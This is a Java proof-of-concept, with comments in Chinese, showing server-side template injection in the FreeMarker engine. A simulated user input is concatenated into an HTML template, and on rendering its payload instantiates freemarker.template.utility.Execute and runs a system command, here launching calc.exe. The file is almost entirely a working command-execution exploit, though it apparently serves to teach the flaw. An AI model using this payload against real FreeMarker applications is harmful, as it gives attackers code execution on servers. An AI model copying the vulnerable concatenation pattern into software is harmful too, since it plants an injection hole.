package com.SugarP1g.ssti.FreeMarker;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

import freemarker.template.Template;
import freemarker.template.TemplateException;


public class POC {

    public static void main(String[] args) {
        Writer out = null;

        try {
            Map<String, Object> dataMap = new HashMap<String, Object>();
            // 模拟外部可控的输入
            String name = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"calc.exe\")}";
            // 外部可控的输入被拼接到模板中，导致模板被污染
            String templateStr = "<!DOCTYPE html><html><body>" +
                    "<form action='/' method='post'>" +
                    "First name:<br/>" +
                    "<input type='text' name='name' value=''>" +
                    "<input type='submit' name='name' value='submit'>" +
                    "</form><h2>Hello " + name + "</h2></body></html>";
            Template template = new Template("test", new StringReader(templateStr), null);
            out = new StringWriter();
            // 渲染过程中，模板中插入的表达式被执行
            template.process(dataMap, out);
            System.out.println("[+] Template Rendering is success.");
        } catch (IOException e) {
            e.printStackTrace();
        } catch (TemplateException e) {
            e.printStackTrace();
        } finally {
            if (out != null) {
                try {
                    out.flush();
                    out.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
